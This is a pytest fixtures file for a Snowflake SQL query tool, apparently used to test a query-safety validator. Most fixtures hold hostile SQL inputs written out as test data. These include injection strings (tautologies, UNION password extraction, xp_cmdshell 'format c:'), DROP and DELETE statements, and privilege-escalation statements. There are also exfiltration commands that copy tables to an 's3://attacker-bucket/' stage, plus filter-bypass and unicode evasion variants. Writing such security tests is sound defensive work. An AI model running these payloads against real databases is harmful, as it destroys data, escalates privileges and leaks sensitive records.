"""
Pytest configuration and fixtures for the test suite.
"""

import pytest
import pandas as pd
from unittest.mock import Mock, patch
import os
import sys

# Add the project root to the Python path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


@pytest.fixture
def sample_dataframe():
    """Sample DataFrame for testing."""
    return pd.DataFrame(
        {
            "id": [1, 2, 3, 4, 5],
            "name": ["Alice", "Bob", "Charlie", "Diana", "Eve"],
            "age": [25, 30, 35, 28, 32],
            "department": ["Engineering", "Sales", "Marketing", "Engineering", "Sales"],
        }
    )


@pytest.fixture
def empty_dataframe():
    """Empty DataFrame for testing."""
    return pd.DataFrame()


@pytest.fixture
def error_dataframe():
    """DataFrame with error column for testing."""
    return pd.DataFrame({"error": ["Connection failed", "Query timeout"]})


@pytest.fixture
def mock_snowflake_session():
    """Mock Snowflake session for testing."""
    mock_session = Mock()
    mock_session.sql.return_value.to_pandas.return_value = pd.DataFrame(
        {
            "TABLE_NAME": ["CUSTOMER", "ORDERS"],
            "TABLE_TYPE": ["BASE TABLE", "BASE TABLE"],
            "ROW_COUNT": [1000, 5000],
        }
    )
    return mock_session


@pytest.fixture
def mock_environment_variables():
    """Mock environment variables for testing."""
    return {
        "SNOWFLAKE_ACCOUNT": "test_account",
        "SNOWFLAKE_USER": "test_user",
        "SNOWFLAKE_PASSWORD": "test_password",
        "SNOWFLAKE_WAREHOUSE": "test_wh",
        "SNOWFLAKE_DATABASE": "test_db",
        "SNOWFLAKE_SCHEMA": "test_schema",
    }


@pytest.fixture
def safe_sql_queries():
    """Collection of safe SQL queries for testing."""
    return [
        "SELECT * FROM snowflake_sample_data.tpch_sf10.customer",
        "SELECT name, email FROM snowflake_sample_data.tpch_sf10.customer LIMIT 10",
        "SELECT COUNT(*) FROM snowflake_sample_data.tpch_sf10.orders",
        "SELECT c.name, o.order_date FROM snowflake_sample_data.tpch_sf10.customer c JOIN snowflake_sample_data.tpch_sf10.orders o ON c.id = o.customer_id",
    ]


@pytest.fixture
def dangerous_sql_queries():
    """Collection of dangerous SQL queries for testing."""
    return [
        "DELETE FROM customer",
        "UPDATE users SET password = 'hacked'",
        "DROP TABLE important_data",
        "INSERT INTO logs VALUES ('malicious')",
        "SELECT * FROM users; DROP TABLE users;",
        "SELECT * FROM data WHERE name = '' OR 1=1 --",
        "GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'",
        "EXECUTE IMMEDIATE 'malicious code'",
    ]


@pytest.fixture
def sql_injection_patterns():
    """Collection of SQL injection patterns for testing."""
    return [
        "1' OR '1'='1",
        "'; DROP TABLE users; --",
        "1 UNION SELECT password FROM admin",
        "1' OR 1=1 --",
        "admin'--",
        "' OR 'x'='x",
        "1'; EXEC xp_cmdshell('format c:'); --",
        # Advanced patterns
        "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
        "1' WAITFOR DELAY '00:00:05'--",
        "1'; DECLARE @q VARCHAR(99);SET @q='SELECT name';EXEC(@q);--",
        "1' AND ASCII(SUBSTRING((SELECT password FROM users),1,1))>64--",
        "admin'; INSERT INTO logs VALUES('injected'); --",
        "1' AND EXISTS(SELECT * FROM users WHERE username='admin')--",
    ]


@pytest.fixture
def large_datasets():
    """Large datasets for performance testing."""

    def create_large_df(rows=10000):
        return pd.DataFrame(
            {
                "id": range(rows),
                "value": [f"value_{i}" for i in range(rows)],
                "category": [f"cat_{i % 10}" for i in range(rows)],
            }
        )

    return create_large_df


@pytest.fixture(autouse=True)
def reset_query_history():
    """Reset query history before each test."""
    from utils.snowflake_utils import _query_history

    _query_history.clear()
    yield
    _query_history.clear()


@pytest.fixture
def patch_snowflake_session():
    """Patch the get_snowflake_session function."""
    with patch("utils.snowflake_utils.get_snowflake_session") as mock:
        yield mock


@pytest.fixture
def patch_spcs_detection():
    """Patch the SPCS environment detection."""
    with patch("utils.snowflake_utils.is_running_in_spcs") as mock:
        yield mock


class TestDataFactory:
    """Factory for creating test data."""

    @staticmethod
    def create_schema_objects_df():
        """Create a sample schema objects DataFrame."""
        return pd.DataFrame(
            {
                "TABLE_NAME": ["CUSTOMER", "ORDERS", "LINEITEM", "PART", "SUPPLIER"],
                "TABLE_TYPE": ["BASE TABLE"] * 5,
                "ROW_COUNT": [150000, 1500000, 6000000, 200000, 10000],
                "BYTES": [
                    1024 * 1024,
                    10 * 1024 * 1024,
                    50 * 1024 * 1024,
                    2 * 1024 * 1024,
                    512 * 1024,
                ],
                "CREATED": [
                    "2023-01-01",
                    "2023-01-02",
                    "2023-01-03",
                    "2023-01-04",
                    "2023-01-05",
                ],
                "TABLE_SCHEMA": ["TPCH_SF10"] * 5,
                "TABLE_CATALOG": ["SNOWFLAKE_SAMPLE_DATA"] * 5,
            }
        )

    @staticmethod
    def create_customer_data():
        """Create sample customer data."""
        return pd.DataFrame(
            {
                "C_CUSTKEY": [1, 2, 3, 4, 5],
                "C_NAME": [
                    "Customer#000000001",
                    "Customer#000000002",
                    "Customer#000000003",
                    "Customer#000000004",
                    "Customer#000000005",
                ],
                "C_ADDRESS": [
                    "IVhzIApeRb ot,c,E",
                    "XSTf4,NCwDVaWNe6tEgvwfmRchLXak",
                    "MG9kdTD2WBHm",
                    "XxVSJsLAGtn",
                    "KvpyuHCplrB84WgAiGV6sYpZq7Tj",
                ],
                "C_NATIONKEY": [15, 13, 1, 4, 3],
                "C_PHONE": [
                    "25-989-741-2988",
                    "23-768-687-3665",
                    "11-719-748-3364",
                    "14-128-190-5944",
                    "13-750-942-6364",
                ],
            }
        )


@pytest.fixture
def advanced_attack_patterns():
    """Advanced attack patterns for comprehensive security testing."""
    return {
        "privilege_escalation": [
            "USE ROLE SYSADMIN",
            "GRANT ALL PRIVILEGES ON *.* TO CURRENT_USER",
            "ALTER USER admin SET PASSWORD = 'hacked'",
            "CREATE ROLE malicious_role",
            "ASSUME ROLE 'ACCOUNTADMIN'",
        ],
        "data_exfiltration": [
            "COPY INTO @external_stage FROM (SELECT * FROM sensitive_table)",
            "SELECT * FROM users; PUT @stage/data.csv file:///tmp/",
            "CREATE STAGE exfil_stage URL='s3://attacker-bucket/'",
            "GET @stage/sensitive_data.csv file:///tmp/stolen.csv",
        ],
        "system_manipulation": [
            "CREATE WAREHOUSE malicious_wh",
            "ALTER WAREHOUSE COMPUTE_WH SET WAREHOUSE_SIZE = 'X4LARGE'",
            "DROP WAREHOUSE COMPUTE_WH",
            "ALTER WAREHOUSE COMPUTE_WH SET AUTO_SUSPEND = 0",
        ],
        "information_disclosure": [
            "SELECT table_name FROM information_schema.tables",
            "SHOW GRANTS TO ROLE current_role()",
            "DESCRIBE TABLE sensitive_data",
            "SELECT privilege_type FROM information_schema.user_privileges",
        ],
        "timing_attacks": [
            "SELECT * FROM customer WHERE id = 1; WAITFOR DELAY '00:00:05'; --",
            "SELECT * FROM data WHERE name = 'test' AND SLEEP(5)",
            "SELECT * FROM users WHERE id = 1 AND BENCHMARK(10000000, MD5('test'))",
        ],
        "bypass_techniques": [
            "SELECT * FROM users/**/WHERE/**/id/**/=/**/1",
            "SEL/**/ECT * FR/**/OM us/**/ers",
            "sElEcT * fRoM uSeRs WhErE iD = 1",
            "SELECT\t*\tFROM\tusers\tWHERE\tid\t=\t1",
        ],
    }


@pytest.fixture
def unicode_attack_vectors():
    """Unicode-based attack vectors for testing input sanitization."""
    return [
        "SELECT * FROM users WHERE name = 'admin\u0000'",  # Null byte
        "SELECT * FROM users WHERE id = '1\u00a0OR\u00a01=1'",  # Non-breaking space
        "SELECT * FROM users WHERE name = 'test\ufeff'",  # Byte order mark
        "SELECT * FROM users WHERE id = '1\u200b OR 1=1'",  # Zero-width space
        "SELECT * FROM users WHERE name = '\u0027 OR 1=1 --'",  # Unicode apostrophe
        "SELECT * FROM users WHERE id = '\u2018admin\u2019'",  # Smart quotes
        "SELECT * FROM users WHERE name = 'test\u180e'",  # Mongolian vowel separator
    ]


@pytest.fixture
def compliance_test_queries():
    """Queries for testing compliance with security standards."""
    return {
        "pii_access": [
            "SELECT ssn, credit_card_number FROM customers",
            "SELECT phone, email, address FROM users",
            "SELECT password, security_question FROM authentication",
            "SELECT birth_date, ssn FROM personal_info",
        ],
        "cross_region": [
            "COPY INTO @eu_stage FROM us_customer_data",
            "SELECT * FROM us_east.customer UNION SELECT * FROM eu_west.customer",
            "CREATE TABLE eu_backup AS SELECT * FROM us_production",
        ],
        "audit_sensitive": [
            "SELECT * FROM financial_records",
            "SELECT salary FROM employee_data",
            "SELECT medical_info FROM patient_records",
        ],
    }


@pytest.fixture
def performance_attack_queries():
    """Queries designed to test performance-based security controls."""
    return [
        # Resource exhaustion
        "SELECT * FROM customer c1, customer c2, customer c3, customer c4",
        "WITH RECURSIVE infinite_loop AS (SELECT 1 UNION ALL SELECT n+1 FROM infinite_loop) SELECT * FROM infinite_loop",
        "SELECT COUNT(*) FROM (SELECT * FROM large_table CROSS JOIN large_table)",
        # Complex nesting
        "SELECT * FROM customer WHERE id IN (SELECT id FROM customer WHERE id IN (SELECT id FROM customer))",
        # Large result sets
        f"SELECT * FROM customer LIMIT {10**6}",
        # Memory intensive operations
        "SELECT * FROM customer ORDER BY RANDOM()",
    ]


@pytest.fixture
def real_world_attack_scenarios():
    """Real-world attack scenarios for comprehensive testing."""
    return {
        "sql_injection_chains": [
            "SELECT * FROM users WHERE id = '1'; DROP TABLE users; --",
            "SELECT * FROM data WHERE name = '' OR 1=1 --",
            "SELECT * FROM logs UNION SELECT password FROM credentials",
        ],
        "privilege_escalation_chains": [
            "SELECT username FROM users; ALTER USER admin SET PASSWORD = 'hacked'; GRANT ALL ON *.* TO admin",
            "USE ROLE SYSADMIN; SELECT * FROM sensitive_data; GRANT ROLE SYSADMIN TO 'attacker'",
        ],
        "data_exfiltration_chains": [
            "SHOW TABLES; COPY INTO @external_stage FROM (SELECT * FROM customer_data)",
            "SELECT table_name FROM information_schema.tables; CREATE STAGE exfil_stage; COPY INTO @exfil_stage FROM sensitive_table",
        ],
        "insider_threats": [
            "SELECT * FROM hr_salaries WHERE employee_id != current_user_id()",
            "UPDATE employee_records SET salary = 999999 WHERE employee_id = current_user_id()",
            "SELECT * FROM finance.budget_data",
        ],
    }


@pytest.fixture
def boundary_value_test_cases():
    """Boundary value test cases for security validation."""
    return {
        "integer_boundaries": [
            f"SELECT * FROM customer LIMIT {2**31}",  # Integer overflow
            f"SELECT * FROM customer LIMIT {2**63}",  # Long overflow
            "SELECT * FROM customer LIMIT -1",  # Negative limit
            "SELECT * FROM customer LIMIT 0",  # Zero limit
        ],
        "string_boundaries": [
            f"SELECT * FROM customer WHERE name = '{'A' * 10000}'",  # Very long string
            "SELECT * FROM customer WHERE name = ''",  # Empty string
            "SELECT * FROM customer WHERE name = NULL",  # NULL value
        ],
        "query_length_boundaries": [
            "SELECT "
            + ", ".join([f"column_{i}" for i in range(5000)])
            + " FROM customer",  # Very long query
            "",  # Empty query
            "   ",  # Whitespace only
        ],
    }


@pytest.fixture
def security_test_environment():
    """Set up a comprehensive security testing environment."""

    class SecurityTestEnv:
        def __init__(self):
            self.blocked_patterns = []
            self.allowed_patterns = []
            self.log_entries = []

        def add_blocked_pattern(self, pattern):
            self.blocked_patterns.append(pattern)

        def add_allowed_pattern(self, pattern):
            self.allowed_patterns.append(pattern)

        def log_security_event(self, event):
            self.log_entries.append(event)

        def reset(self):
            self.blocked_patterns = []
            self.allowed_patterns = []
            self.log_entries = []

    return SecurityTestEnv()


# Mark decorators for different test categories
pytest_mark_unit = pytest.mark.unit
pytest_mark_integration = pytest.mark.integration
pytest_mark_slow = pytest.mark.slow
pytest_mark_security = pytest.mark.security
